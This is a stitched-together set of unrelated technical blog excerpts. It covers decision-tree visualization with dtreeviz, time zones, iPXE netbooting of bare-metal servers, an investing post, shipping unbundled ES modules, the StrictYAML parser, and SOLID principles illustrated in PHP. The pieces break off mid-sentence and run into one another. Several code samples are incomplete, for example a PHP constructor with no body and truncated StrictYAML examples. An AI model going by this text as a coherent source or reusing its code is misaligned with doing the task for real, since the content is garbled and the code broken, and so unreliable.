<p>Any path from the root of the decision tree to a specific leaf predictor passes through a series of (internal) decision nodes. Each decision node compares a single feature's value in <span>x</span>, <span>x<sub>i</sub></span>, with a specific <i>split point</i> value learned during training. For example, in a model predicting apartment rent prices, decision nodes would test features such as the number of bedrooms and number of bathrooms. (See <b>Section 1.5.3</b> <i>Visualizing tree interpretation of a single observation</i>.) Even in a classifier with discrete target values, decision nodes still compare numeric <i>feature</i> values because scitkit's decision tree implementation assumes that all features are numeric. Categorical variables must be <a href="https://machinelearningmastery.com/how-to-one-hot-encode-sequence-data-in-python/">one hot encoded</a>, <a href="https://www.analyticsvidhya.com/blog/2015/11/easy-methods-deal-categorical-variables-predictive-modeling/">binned</a>, <a href="http://forums.fast.ai/t/to-label-encode-or-one-hot-encode/6057">label encoded</a>, etc... </p>

<p>To train a decision node, the model examines a subset of the training observations (or the full training set at the root). The node's feature and split point within that feature space are chosen during training to split the observations into left and right buckets (subsets) to maximize similarity as defined above. (This selection process is generally done through exhaustive comparison of features and  feature values.) The left bucket has observations whose <span>x<sub>i</sub></span> feature values are all less than the split point and the right bucket has observations whose <span>x<sub>i</sub></span> is greater than the split point.   Tree construction proceeds recursively by creating decision nodes for the left bucket and the right bucket.  Construction stops when some stopping criterion is reached, such as having less than five observations in the node.</p>



<h2 id="sec:1.2">1.2 The key elements of decision tree visualization</h2>


<p>Decision tree visualizations should highlight the following important elements, which we demonstrate below.</p>
<ul>
<li>Decision node <b>feature versus target value</b> distributions (which we call feature-target space in this article). We want to know how separable the target values are based upon the feature and a split point.</li>
<li>Decision node <b>feature name and feature split value</b>.  We need to know which feature each decision node is testing and where in that space the nodes splits the observations.</li>
<li><b>Leaf node purity</b>, which affects our prediction confidence. Leaves with low variance among the target values (regression) or an overwhelming majority target class (classification) are much more reliable predictors.</li>
<li><b>Leaf node prediction value</b>.  What is this leaf actually predicting from the collection of target values?</li>
<li><b>Numbers of samples in decision nodes</b>.  Sometimes it's useful to know where all most of the samples are being routed through the decision nodes.</li>
<li><b>Numbers of samples in leaf nodes</b>.  Our goal is a decision tree with fewer, larger and purer leaves. Nodes with too few samples are possible indications of overfitting.</li>
<li>How a specific feature vector is <b>run down the tree</b> to a leaf. This helps explain why a particular feature vector gets the prediction it does. For example, in a regression tree predicting apartment rent prices, we might find a feature vector routed into a high predicted price leaf because of a decision node that checks for more than three bedrooms.</li>
</ul>

<p>Before digging into the previous state-of-the-art visualizations, we'd like to give a little spoiler to show what's possible. This section highlights some samples visualizations we built from scikit regression and classification decision trees on a few data sets. You can also check out the	<a href="https://github.com/parrt/dtreeviz/tree/master/testing/samples">full gallery</a> and <a href="https://github.com/parrt/dtreeviz/blob/master/testing/gen_samples.py">code to generate all samples</a>.</p>

<h2 id="sec:1.4">1.4 A comparison to previous state-of-the-art visualizations</h2>


<p>If you search for “visualizing decision trees” you will quickly find a <b>Python</b> solution provided by the awesome scikit folks: <a href="http://scikit-learn.org/stable/modules/generated/sklearn.tree.export_graphviz.html">sklearn.tree.export_graphviz</a>.  With more work, you can find visualizations for <a href="http://scikit-learn.org/stable/modules/tree.html">R</a> and even <a href="http://support.sas.com/documentation/cdl/en/vaug/68027/HTML/default/viewer.htm#n0q3i0zwng79kin1kb1zvpo9k312.htm">SAS</a> and <a href="https://www.ibm.com/support/knowledgecenter/en/SS4QC9/com.ibm.solutions.wa_an_overview.2.0.0.doc/wa_discover_viz_expl_insigths_dec_tree.html">IBM</a>. In this section, we collect the various decision tree visualizations we could find and compare them to the visualizations made by our <span>dtreeviz</span> library. We give a more detailed discussion of our visualizations in the next section.</p>

<p>Let's start with the <a href="http://scikit-learn.org/stable/modules/tree.html">default scitkit visualization</a> of a decision tree on the well-known <a href="http://scikit-learn.org/stable/modules/generated/sklearn.datasets.load_iris.html#sklearn.datasets.load_iris">Iris</a> data set (click on images to enlarge).</p>

<p>The scikit tree does a good job of representing the tree structure, but we have a few quibbles.  The colors aren't the best and it's not immediately obvious why some of the nodes are colored and some aren't.  If the colors represent predicted class for this classifier, one would think just the leaves would be colored because only leaves have predictions. (It turns out the non-colored nodes have no majority prediction.) Including the gini coefficient (certainty score) costs space and doesn't help with interpretation. The count of samples of the  various target classes in each node is somewhat useful, but a histogram would be even better. A target class color legend would be nice.  Finally, using true and false as the edge labels isn't as clear as, say, labels <img src="https://explained.ai/decision-tree-viz/images/eqn-524A50782178998021A88B8CD4C8DCD8-depth000.51.svg"> and <img src="https://explained.ai/decision-tree-viz/images/eqn-4EDC933D28BFE3F5EFFE94BF892DAD38-depth001.72.svg">. The most obvious difference is that our decision nodes show feature distributions as overlapping stacked-histograms, one histogram per target class. Also, our leaf size is proportional to the number of samples in that leaf.</p>

<p>Scikit uses the same visualization approach for decision tree regressors. For example, here is scikit's visualization using the <a href="http://scikit-learn.org/stable/modules/generated/sklearn.datasets.load_boston.html">Boston</a> data set, with <span>dtreeviz</span>'s version for comparison (click to enlarge images):</p>

<p>In the scikit tree, it's not immediately clear what the use of color implies, but after studying the image, darker images indicate higher predicted target values. As before, our decision nodes show the feature space distribution, this time using a feature versus target value scatterplot.  The leaves use strip plots to show the target value distribution; leaves with more dots naturally have a higher number of samples.</p>

<p><b>R</b> programmers also have access to a package for <a href="http://blog.revolutionanalytics.com/2013/06/plotting-classification-and-regression-trees-with-plotrpart.html">visualizing decision trees</a>, which gives similar results to scikit but with nicer edge labels:</p>

If that wasn't enough fun, there's also the political implications of recognizing certain time zones such as Israel Standard Time.</p><p>Some developers took the safer route and identified time zones only by the name of a prominent city in it, not bothering to map it to a common name. That's why the Ubuntu time zone picker makes you select "New York'' instead of Eastern Standard Time.</p><figure><img src="https://www.zainrizvi.io/content/images/2020/10/image-4.png" alt="" srcset="https://www.zainrizvi.io/content/images/size/w600/2020/10/image-4.png 600w, https://www.zainrizvi.io/content/images/2020/10/image-4.png 826w" sizes="(min-width: 720px) 720px"></figure><h4 id="forget-time-zones-use-the-raw-utc-offset">Forget time zones, use the raw UTC offset</h4><p>W3's international standard gave up on the notion of time zones and declared that engineers should only store a timestamp's<a href="https://www.w3.org/TR/NOTE-datetime"> raw UTC offset</a>.</p><h4 id="gps-coordinates">GPS Coordinates</h4><p>Fun fact: Many APIs for getting a region's UTC offset only want a UTC time and latitude/longitude coordinates.

            <div>
            

            <p>I am sure you heard about bare metal. Clouds are made of bare metal, for example.</p>

<p>The art of bringing to life an unanimated piece of metal like a server to something useful is something I am learning since I joined <a href="https://metal.equinix.com/">Equinix Metal</a> in May.</p>

<p>Let me make a comparison with something you are probably familiar with. Do you know why Kubernetes is hard? Because there is not one Kubernetes. It is a glue of an unknown number of pieces working together to help you deploy your application.</p>

<p>Bare Metal is almost the same, hundreds of different providers, server size, architectures, chips that in some way you have to bring to life.</p>

<p>We have to work with some common concepts we have. When a server boots, it runs a BIOS that looks in different places for something to run:</p>

<ol>
  <li>It looks for a hard drive</li>
  <li>It looks for external storage like a USB stick or a CD-Rom</li>
  <li>It looks for help from your network (netbooting)</li>
</ol>

<p>Options one and two are not realistic if the end goal is to get to a handsfree, reliable solution. I am sure cloud providers do not have people running around with a USB stick containing operating systems and firmware.</p>

<h2 id="netbooting">Netbooting</h2>

<p>I spoke about <a href="https://gianarb.it/blog/first-journeys-with-netboot-ipxe">my first experience netbooting Ubuntu</a> on my blog. That article is efficient with reproducible code. Here the theory.</p>

<p>When it comes to netbooting, you have to know what PXE means. Preboot Execution Environment is a standardized client/server environment that boots when no operating system is found, and it helps an administrator boot an operating system remotely. Don’t think about this OS as the one you have in your laptop, I mean, technically it is, but the one your run there or in a server is persisted, that’s why you can have files that survive a reboot.</p>

<p>The one you start with PXE runs in memory, and from there, you have to figure out how to get the persisted OS you will run in your machine.</p>

<p>When the in-memory operation system is up and running, you can do everything you are capable of with Ubuntu, Alpine, CentOS, or Debian. In practice, what people tend to do is to run applications and scripts to format a disk with the right partition and to install the end operation system.</p>

<p>Pretty cool. PXE is kind of old, and for that reason, it is burned into a lot of different NICs. You will hear a lot more about iPXE, a “new” PXE implementation. What is cool about those is the <code>chain</code> function. From one PXE/iPXE environment, you can chain another PXE/iPXE environment. That’s how you get from PXE (that usually runs by default in a lot of hardware (if you have a NUC you run it)) to iPXE.</p>

<div><div><pre><code>chain --autofree https://boot.netboot.xyz/ipxe/netboot.xyz.lkrn
</code></pre></div></div>

<p>iPXE supports a lot more protocols usable to download OS from such as TFTP, FTP, HTTP/S, NFC…</p>

<p>This is an example of iPXE script:</p>

<div><div><pre><code>#!ipxe
dhcp net0

set base-url http://archive.ubuntu.com/ubuntu/dists/focal/main/installer-amd64/current/legacy-images/netboot/ubuntu-installer/amd64/
kernel ${base-url}/linux console=ttyS1,115200n8
initrd ${base-url}/initrd.gz
boot
</code></pre></div></div>

<p>The first command, <code>dhcp net0</code>, gets an IP for your hardware from the DHCP. <code>kernel</code> and <code>initrd</code> set the kernel and the initial ramdisk to run in memory.</p>

<p><code>boot</code> starts the <code>kernel</code> and the <code>initrd</code> you just set.</p>

<p>There is more; this is what I find myself using more often.</p>

<h3 id="infrastructure">Infrastructure</h3>

<p>To netboot successfully, you need to distribute a couple of things:</p>

<ol>
  <li>An iPXE script</li>
  <li>The operating system you want to run (kernel and initrd)</li>
</ol>

<h3 id="workflow">Workflow</h3>

<ol>
  <li>Server starts</li>
  <li>There is nothing to boot in the HD</li>
  <li>Starts netbooting</li>
  <li>It makes a DHCP request to get network configuration, and  the DHCP returns the TFTP address with the location of the iPXE binary</li>
  <li>iPXE starts and makes another DHCP request; the response contains the URL of the iPXE scripts with the commands you saw above</li>
  <li>At this point, iPXE runs the script, downloads the kernel, and the initrd with the protocol you specified, and it runs the in-memory operating system.</li>
</ol>

<p>Pretty cool!</p>

<h2 id="the-in-memory-operating-system">The in-memory operating system</h2>

<p>The in-memory operating system can be as smart as you like; you can build your one, for example, starting from Ubuntu or Alpine. Size counts here because it has to fit in memory.</p>

<p>When the operating system starts, it runs as PID 1, what is called <code>init.</code> It is an executable located in the ramdisk called <code>/init.</code> That script can be as complicated as you like. It can be a problematic binary that downloads from a centralized location commands to execute, or it can be bash scripts that format the local disk and installs the final operating system.</p>

<p>What I am trying to say is that you have to make the in-memory operating system useful for your purpose. If you use native Alpine or Ubuntu, the init script will start a bash shell, not that useful.</p>

<h2 id="dhcp">DHCP</h2>

<p>As you saw, the DHCP plays an important role. It is the first point of contact between unanimated hardware and the world. If you can control what the DHCP can do, you can, for example, register and monitor the healthiness of a server.</p>

<p>Imagine you are at your laptop, and you are expecting a hundred new servers in one of your datacenters, monitoring the DHCP requests. You will know when they are plugged into the network.</p>

<h2 id="containers-what">Containers what?</h2>

<p>Containers are a comfortable way to distribute and run applications without having to know how to run them. Think about this scenario. Your in-memory operating system at boot runs Docker. The <code>init</code> script at this point can pull and run a Docker container with your logic for partitioning the disk and installing an operating system, or it runs some workload and exit leaving space for the next boot (a bit like serverless, but with servers, way cooler).</p>

<p>Or the Docker Container can run a more complex application that reaches a centralized server that dispatches a list of actions to execute via a REST or gRPC API. Those actions can be declared and stored from you.</p>

<h2 id="conclusion">Conclusion</h2>

<p>The chain of tools and interactions to get from a piece of metal to something that runs some workload is not that long. Controlling all the steps and the tools along the way gives provides the ability to provisioning cold servers from zero to something that developers know better how to use.</p>

<p>Ok, I lied to you. This is not just theory. This is how <a href="https://tinkerbell.org/">Tinkerbell</a> works.</p>

                    <p>For quite some time I've been monitoring the markets, and waiting for a dip to invest my cash. However, a few weeks ago I decided to put this assumption to the test. Is buying the dip the best I could do with my hard earned cash?</p><ul><li>Like most employees, I have a salary and some yearly disposable income to dedicate to my long term savings or investments. Concretely, I have about <strong>£20000 a year to dedicate to my investments</strong>.</li><li>I decided to <strong>invest only on indexes</strong>, because I got burned with individual stocks (and crypto) multiple times (a.k.a.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
<p>For the last year, I’ve been running a single-page web app powered by ES modules in production.</p>
<p>It’s a JavaScript app but it doesn’t use Babel, Webpack, Rollup, or any other tooling for transpiling or bundling. The files I write in development are the same files that get served to end-users in production.</p>
<p>The app is for a side-project… an <a href="https://musicboxfun.com/">online music-box song making tool</a>. It’s not a massive app, but it’s not tiny either—there’s currently about 60 JavaScript modules, which are a mix of components, utilities, and third-party libraries. <a href="https://github.com/bryanbraun/music-box-fun/tree/master/site">The codebase</a> looks a lot like a ReactJS project, but it doesn’t use React. It uses a plain JavaScript alternative that substitutes abstractions (like JSX) with native JavaScript features (like template strings). The framework isn’t relevant for the purpose of this post but you can read more about it in <a href="https://www.bryanbraun.com/2019/09/11/web-dev-nirvana-and-why-I-needed-to-let-go-of-reactjs-to-reach-it/">my earlier post</a>, if you are curious.</p>
<p>When I launched the app in August 2019, the industry consensus was that using unbundled ES6 modules in production was a bad idea. Khan Academy tried unbundling their homepage JS and concluded that <a href="https://blog.khanacademy.org/forgo-js-packaging-not-so-fast/">it slowed down their initial page load</a>. That was five years ago and I still don’t know of anybody who seriously considers skipping the bundler and using ES6 modules in production.*</p>
<p>And that’s too bad because now that <a href="https://caniuse.com/es6-module">browser support for ES modules is great</a>, it seems like we could avoid a lot of <a href="https://www.bryanbraun.com/2019/04/16/nonsense/">nonsense</a> by just <a href="https://twitter.com/BryanEBraun/status/1295171120459546624">writing JavaScript that the browser understands</a> (at least for projects where it makes sense).</p>
<p>I kept looking for examples of people doing this but I struggled to find them, so I decided I’d give it a try and see how bad it really was. Here’s what I found:</p>
<h2 id="things-that-met-expectations">Things that met expectations</h2>
<p><strong>Development experience.</strong> I expected the development experience to be great, and it was. There’s no setup instructions, no startup delays. No need to watch files, generate source maps, or wait for things to recompile. Just save the file and refresh. ✨</p>
<p><strong>Deployment.</strong> Deployment was straightforward. All I needed to do was copy my code to the server as-is. My web host Netlify makes it easy to do this on git push (though, to be fair, Netlify can make even the most complex setups easy to deploy).</p>
<p><strong>Dev/Prod parity.</strong> Every time I found a production bug I was able to reproduce it locally. Not a major goal, but very convenient.</p>
<h2 id="things-that-were-worse-than-expected">Things that were worse than expected</h2>
<p><strong>Dependencies not supporting ES modules.</strong>
I often found libraries I wanted to use, only to learn that they didn’t support ES modules. They usually supported CommonJS instead, which meant I couldn’t use them. At first, I was working around this by loading versions of the library that use browser globals (either via script tag, or <a href="https://stackoverflow.com/q/41127479/1154642">side-effects import</a>). This worked, but it didn’t feel ideal.</p>
<p>Eventually, I started using <a href="https://www.snowpack.dev/">Snowpack</a>, which can import dependencies that don’t support ES modules and produce a one-time build that does. This worked so well that <a href="https://github.com/sparkbox/bouncy-ball/pull/104">I’ve started using it on other projects</a>.</p>
<p><strong>Environment variables.</strong> Typically, I’d assign these at build-time but you can’t when there’s no build. Fortunately, Cory House has <a href="https://www.freecodecamp.org/news/environment-settings-in-javascript-apps-c5f9744282b6/">a great post describing all the options</a>. I ended up using <a href="https://www.freecodecamp.org/news/environment-settings-in-javascript-apps-c5f9744282b6/#option-6-environment-sniffing">environment sniffing</a> which feels a little weird, but ultimately isn’t a big deal for my app.</p>
<p><strong>CSS organization.</strong> I went with traditional CSS using BEM conventions, which was fine. I still wanted to break up my files though, so I used a <code>main.css</code> file with a bunch of <code>@imports</code>. That felt better, but then I had a blocking request that delayed page rendering so <a href="https://github.com/bryanbraun/music-box-fun/commit/dc2cc62c58ae61d972c124a433ca00d9aac304a2">I moved the <code>@imports</code> into an inline style tag</a>. I’m not sure if I like it, so I may keep iterating on this.</p>
<h2 id="things-that-were-better-than-expected">Things that were better than expected</h2>
<p><strong>Cache invalidation.</strong> I was worried that I was going to have trouble invalidating cached CSS or JavaScript (since I couldn’t rely on a bundler to give my assets cache-busting filenames). It turns out that <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/ETag">ETags</a> are a great solution for this (especially since <a href="https://www.netlify.com/blog/2017/02/23/better-living-through-caching/">my web host has a solid implementation that’s quick and simple</a>). I’ve heard that cache-busting filenames can be a bit faster than Etags, but Netlify’s implementation feels pretty snappy to me.</p>
<p><strong>Performance.</strong>
Everything I heard said that ES module performance was going to be terrible, even with HTTP/2. So I braced myself and… it’s been great. I haven’t even done any optimizations beyond making sure that my initial HTML file had some good default markup. I suspect the performance is good because my app isn’t big enough to start hitting any bottlenecks yet (<a href="https://v8.dev/features/modules#performance">this research</a> says you’ll be fine if you’re below a couple hundred modules, which <a href="https://twitter.com/lukejacksonn/status/1318158374878457857">seems to be confirmed anecdotally</a>). This made me realize that that my intuition was off on what was “too big” of an app. You can go a long way before you’re in a place where you need to load 300-500 files, all at once. It feels unlikely that I’ll reach those limits on my app, at least.</p>
<p>I was a little worried about not minifying my JavaScript. Isn’t that a huge number of bytes saved? It turns out that the difference is a lot smaller when your files are served gzipped (or <a href="https://www.netlify.com/blog/2020/05/20/gain-instant-performance-boosts-as-brotli-comes-to-netlify-edge/">brotli-compressed, as in my case</a>). Minifying would still make my files smaller by renaming variables and stripping out comments, but the difference was less than I expected.</p>
<p><strong>Browser support.</strong> Since I wasn’t using Babel, I expected lots of cross-browser issues but they were rare.** It turns out that once you drop IE11 support, browser support of modern JS features is really good. Things like arrow functions, const/let, template strings, ES6 classes, and <code>fetch</code> all have over 95% global support (and that’s including IE11). The only time I didn’t get to use a JS feature I really wanted was <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/Optional_chaining">the optional chaining operator</a>, and that feature will probably have 95% support in the next year or two. Evergreen browsers are a powerful thing.</p>
<h2 id="overall-assessment">Overall Assessment</h2>
<p>I’ve been pleasantly surprised. If this were a typical, bundled, single-page-application, I would have needed to deal with one or two major tooling upgrades by now. Instead, I’ve been able to focus on features. <a href="https://blog.jim-nielsen.com/2020/cheating-entropy-with-native-web-tech/">Native web technologies FTW</a>!</p>
<p>If my module count gets so big that performance starts to noticeably degrade, I’m pretty confident that I’ll be able to use Snowpack to work through it. From <a href="https://www.snowpack.dev/#bundle-for-production">their docs</a>:</p>
<blockquote>
<p>Snowpack treats bundling as an optional production optimization, which means you’re free to skip over the extra complexity of bundling until you need it. <strong>You should be able to use a bundler because you want to, and not because you need to</strong>.</p>
</blockquote>
<p>I like this idea of postponing complexity. It feels very agile.</p>
<p>Maybe ES modules aren’t for every project but they’ve worked pretty well for mine. If there are fundamental flaws, I haven’t found them yet.</p>
<p>Honestly, it’s hard for me to imagine building a side-project any other way right now.</p>

** More accurately, I <em>have</em> faced some cross-browser issues but they weren’t the kind that Babel could help me with. Babel’s polyfills don’t help when <a href="https://github.com/bryanbraun/intersection-observer-issue">the browser implementation has bugs</a> or <a href="https://github.com/bryanbraun/music-box-fun/issues/7#issuecomment-643037151">your approach is fundamentally flawed</a>. 🙃

<p>StrictYAML is a <a href="https://en.wikipedia.org/wiki/Type_safety">type-safe</a> YAML parser
that parses and validates a <a href="https://hitchdev.com/strictyaml/features-removed">restricted subset</a> of the <a href="https://hitchdev.com/strictyaml/what-is-yaml">YAML</a>
specification.</p>

<p>Priorities:</p>

<ul>
<li>Beautiful API</li>
<li>Refusing to parse <a href="https://hitchdev.com/strictyaml/features-removed">the ugly, hard to read and insecure features of YAML</a> like <a href="https://hitchdev.com/strictyaml/why/implicit-typing-removed">the Norway problem</a>.</li>
<li>Strict validation of markup and straightforward type casting.</li>
<li>Clear, readable exceptions with <strong>code snippets</strong> and <strong>line numbers</strong>.</li>
<li>Acting as a near-drop in replacement for pyyaml, ruamel.yaml or poyo.</li>
<li>Ability to read in YAML, make changes and write it out again with comments preserved.</li>
<li><a href="https://hitchdev.com/strictyaml/why/speed-not-a-priority">Not speed</a>, currently.</li>
</ul>

<p>Simple example:</p>
<div><pre><code data-lang="yaml"><span># All about the character</span><span>
</span><span></span>name<span>:</span><span> </span>Ford<span> </span>Prefect<span>
</span><span></span>age<span>:</span><span> </span><span>42</span><span>
</span><span></span>possessions<span>:</span><span>
</span><span></span>-<span> </span>Towel</code></pre></div><div><pre><code data-lang="python"><span>from</span> <span>strictyaml</span> <span>import</span> <span>load</span><span>,</span> <span>Map</span><span>,</span> <span>Str</span><span>,</span> <span>Int</span><span>,</span> <span>Seq</span><span>,</span> <span>YAMLError</span></code></pre></div>
<p>Default parse result:</p>
<div><pre><code data-lang="python"><span>&gt;&gt;&gt;</span> <span>load</span><span>(</span><span>yaml_snippet</span><span>)</span>
<span>YAML</span><span>(</span><span>OrderedDict</span><span>([(</span><span>'name'</span><span>,</span> <span>'Ford Prefect'</span><span>),</span> <span>(</span><span>'age'</span><span>,</span> <span>'42'</span><span>),</span> <span>(</span><span>'possessions'</span><span>,</span> <span>[</span><span>'Towel'</span><span>])]))</span></code></pre></div>
<p>All data is string, list or OrderedDict:</p>
<div><pre><code data-lang="python"><span>&gt;&gt;&gt;</span> <span>load</span><span>(</span><span>yaml_snippet</span><span>)</span><span>.</span><span>data</span>
<span>OrderedDict</span><span>([(</span><span>'name'</span><span>,</span> <span>'Ford Prefect'</span><span>),</span> <span>(</span><span>'age'</span><span>,</span> <span>'42'</span><span>),</span> <span>(</span><span>'possessions'</span><span>,</span> <span>[</span><span>'Towel'</span><span>])])</span></code></pre></div>
<p>Quickstart with schema:</p>
<div><pre><code data-lang="python"><span>from</span> <span>strictyaml</span> <span>import</span> <span>load</span><span>,</span> <span>Map</span><span>,</span> <span>Str</span><span>,</span> <span>Int</span><span>,</span> <span>Seq</span><span>,</span> <span>YAMLError</span>

<span>schema</span> <span>=</span> <span>Map</span><span>({</span><span>"name"</span><span>:</span> <span>Str</span><span>(),</span> <span>"age"</span><span>:</span> <span>Int</span><span>(),</span> <span>"possessions"</span><span>:</span> <span>Seq</span><span>(</span><span>Str</span><span>())})</span></code></pre></div>
<p>42 is now parsed as an integer:</p>
<div><pre><code data-lang="python"><span>&gt;&gt;&gt;</span> <span>person</span> <span>=</span> <span>load</span><span>(</span><span>yaml_snippet</span><span>,</span> <span>schema</span><span>)</span>

<p>A YAMLError will be raised if there are syntactic problems, violations of your schema or use of disallowed YAML features:</p>
<div><pre><code data-lang="yaml"><span># All about the character</span><span>

<p>For example, a schema violation:</p>
<div><pre><code data-lang="python"><span>try</span><span>:</span>
    <span>person</span> <span>=</span> <span>load</span><span>(</span><span>yaml_snippet</span><span>,</span> <span>schema</span><span>)</span>

<p>You can modify values and write out the YAML with comments preserved:</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><div><p>SOLID outlines a group of guidelines that developers can use to simplify and clarify their code. While they are certainly not laws, understanding these concepts will make you a better developer. In overview, the five SOLID principles are:</p>
<ul>
<li>Single-responsibility principle; A class should only have a single responsibility, that is, only changes to one part of the software's specification should be able to affect the specification of the class.</li>
<li>Open–closed principle; Your classes should be open for extension but closed for modification.</li>
<li>Liskov substitution principle; Objects in a program should be replaceable with instances of their subtypes without altering the correctness of that program.</li>
<li>Interface segregation principle; Many client-specific interfaces are better than one general-purpose interface.</li>
<li>Dependency inversion principle; One should depend upon abstractions, not concretions.
Don't worry if you don't understand what all those mean at the first time of reading - I didn't. I will now go over each principle one by one, and try to explain not just how they work, but how they will benefit you in the long run.</li>
</ul>
<h2 id="single-responsibility-principle">Single-responsibility principle</h2>
<p>The most common of the SOLID design principles, the single responsibility principle states that a class should have only one reason to change. When a class handles more than one responsibility, any changes made to the functionalities may propagate throughout the application in unexpected ways. This unexpected behaviour can be bad enough if you have a smaller application but can become a nightmare when you work with large, enterprise-level software. By making sure that each function only encapsulates only one responsibility, you can save a lot of testing time and create a more maintainable architecture.</p>
<p>Let me show you an example. I will use PHP but you can apply SOLID design principles to any other OOP languages, too.</p>
<p>Let's imagine we have a class that represents a text document, where said document has a title and content. This document must be able to be exported to HTML and PDF.</p>
<pre><code><span>&lt;?php</span>

<span>class</span><span> </span><span>Document</span>
<span>{</span>
<span>    </span><span>protected</span><span> </span><span>$</span><span>title</span><span>;</span>
<span>    </span><span>protected</span><span> </span><span>$</span><span>content</span><span>;</span>

<span>    </span><span>public</span><span> </span><span>function</span><span> </span><span>__construct</span><span>(</span><span>string</span><span> </span><span>$</span><span>title</span><span>, </span><span>string</span><span> </span><span>$</span><span>content</span><span>)</span>

<span>        </span><span>$</span><span>this</span><span>-&gt;</span><span>content</span><span>=</span><span> </span><span>$</span><span>content</span><span>;</span>
<span>    </span><span>}</span>

<span>    </span><span>public</span><span> </span><span>function</span><span> </span><span>getTitle</span><span>()</span><span>: </span><span>string</span>
<span>    </span><span>{</span>
<span>        </span><span>return</span><span> </span><span>$</span><span>this</span><span>-&gt;</span><span>title</span><span>;</span>
<span>    </span><span>}</span>

<span>    </span><span>public</span><span> </span><span>function</span><span> </span><span>getContent</span><span>()</span><span>: </span><span>string</span>
<span>    </span><span>{</span>
<span>        </span><span>return</span><span> </span><span>$</span><span>this</span><span>-&gt;</span><span>content</span><span>;</span>
<span>    </span><span>}</span>

<span>    </span><span>public</span><span> </span><span>function</span><span> </span><span>exportHtml</span><span>()</span><span> </span><span>{</span>
<span>        </span><span>echo</span><span> </span><span>"</span><span>DOCUMENT EXPORTED TO HTML</span><span>"</span><span>.</span><span>PHP_EOL</span><span>;</span><span>echo</span><span> </span><span>"</span><span>Title: </span><span>"</span><span>.</span><span>$</span><span>this</span><span>-&gt;</span><span>getTitle</span><span>()</span><span>.</span><span>PHP_EOL</span><span>;</span>
<span>        </span><span>echo</span><span> </span><span>"</span><span>Content: </span><span>"</span><span>.</span><span>$</span><span>this</span><span>-&gt;</span><span>getContent</span><span>()</span><span>.</span><span>PHP_EOL</span><span>.</span><span>PHP_EOL</span><span>;</span>
<span>    </span><span>}</span>

<span>    </span><span>public</span><span> </span><span>function</span><span> </span><span>exportPdf</span><span>()</span><span> </span><span>{</span>
<span>        </span><span>echo</span><span> </span><span>"</span><span>DOCUMENT EXPORTED TO PDF</span><span>"</span><span>.</span><span>PHP_EOL</span><span>;</span>
<span>        </span><span>echo</span><span> </span><span>"</span><span>Title: </span><span>"</span><span>.</span><span>$</span><span>this</span><span>-&gt;</span><span>getTitle</span><span>()</span><span>.</span><span>PHP_EOL</span><span>;</span>
<span>        </span><span>echo</span><span> </span><span>"</span><span>Content: </span><span>"</span><span>.</span><span>$</span><span>this</span><span>-&gt;</span><span>getContent</span><span>()</span><span>.</span><span>PHP_EOL</span><span>.</span><span>PHP_EOL</span><span>;</span>
<span>    </span><span>}</span>
<span>}</span></code></pre>
<p>In this case, it is not the responsibility of the document to export itself to a particular format, the document should only be a representation of itself.</p>
<p>The key to solving this is to move each of the export methods into their own classes, which will implement an "Exportable" interface.</p>
<pre><code><span>&lt;?php</span>
<span>interface</span><span> </span><span>ExportableDocumentInterface</span>
<span>{</span>
<span>    </span><span>public</span><span> </span><span>function</span><span> </span><span>export</span><span>(</span><span>Document</span><span> </span><span>$</span><span>document</span><span>);</span>
<span>}</span></code></pre>
<p>The next thing we have to do is extract the logic that does not apply to the class.</p>
<pre><code><span>&lt;?php</span>
<span>class</span><span> </span><span>PdfExportableDocument</span><span> </span><span>implements</span><span> </span><span>ExportableDocumentInterface</span>

<span>    </span><span>}</span>
<span>}</span>

<span>class</span><span> </span><span>HtmlExportableDocument</span><span> </span><span>implements</span><span> </span><span>ExportableDocumentInterface</span>
<span>{</span>

<h2 id="openclosed-principle">Open–closed principle</h2>
<p>The open-closed principle states that objects or entities should be open for extension, but closed for modification. This is one of those principles that developers often skip over - but try not to. These techniques are paramount to mature design.</p>
<p>So, you should be able to extend your existing code using features like inheritance via subclasses and interfaces. However, you should never modify classes, interfaces, and other code units that already exist, as it can lead to unexpected behaviour. If you add a new feature by extending your code rather than modifying it, you reduce the risk of failure as much as possible.</p>
<p>Let's imagine that we need to achieve a login system. To authenticate our user we require a username and a password, so far so good. So what happens a year later if we want the ability for a user to authenticate through Twitter or Facebook? It is important to understand that what has been asked of us is not a change to a current feature, but rather to build a new feature.</p>
<p>Let's say our authentication class looks like this, where you call an authenticate method for your user.</p>
<pre><code><span>&lt;?php</span>
<span>class</span><span> </span><span>LoginService</span>
<span>{</span>
<span>    </span><span>public</span><span> </span><span>function</span><span> </span><span>login</span><span>($</span><span>user</span><span>)</span>
<span>    </span><span>{</span>
<span>        </span><span>$</span><span>this</span><span>-&gt;</span><span>authenticateUser</span><span>(</span><span>$</span><span>user</span><span>)</span><span>;</span>
<span>    </span><span>}</span>
<span>}</span></code></pre>
<p>When it comes to implementing our third-party user, we may want to try something like this, where we check what type of user we have using an if statement, and executing code accordingly.</p>
<pre><code><span>&lt;?php</span>
<span>class</span><span> </span><span>LoginService</span>
<span>{</span>
<span>    </span><span>public</span><span> </span><span>function</span><span> </span><span>login</span><span>($</span><span>user</span><span>)</span>
<span>    </span><span>{</span>
<span>        </span><span>if</span><span> (</span><span>$</span><span>user</span><span> </span><span>instanceof</span><span> </span><span>User</span><span>) </span><span>{</span>
<span>            </span><span>$</span><span>this</span><span>-&gt;</span><span>authenticateUser</span><span>(</span><span>$</span><span>user</span><span>)</span><span>;</span>
<span>        </span><span>}</span><span> </span><span>else</span><span> </span><span>if</span><span> (</span><span>$</span><span>user</span><span> </span><span>instanceOf</span><span> </span><span>ThirdPartyUser</span><span>) </span><span>{</span>
<span>            </span><span>$</span><span>this</span><span>-&gt;</span><span>authenticateThirdPartyUser</span><span>(</span><span>$</span><span>user</span><span>)</span><span>;</span>
<span>        </span><span>}</span>
<span>    </span><span>}</span>
<span>}</span></code></pre>
<p>This isn't good because we are modifying code that already is in place. It may look good now, but what happens when you are supporting five or 6 authentication types? Instead, you should abstract and work to an interface. The first thing we should do is build an interface that complies with what we want to do for the specific use case.</p>
<pre><code><span>&lt;?php</span>
<span>interface</span><span> </span><span>LoginInterface</span>
<span>{</span>
<span>    </span><span>public</span><span> </span><span>function</span><span> </span><span>authenticateUser</span><span>($</span><span>user</span><span>);</span>
<span>}</span></code></pre>
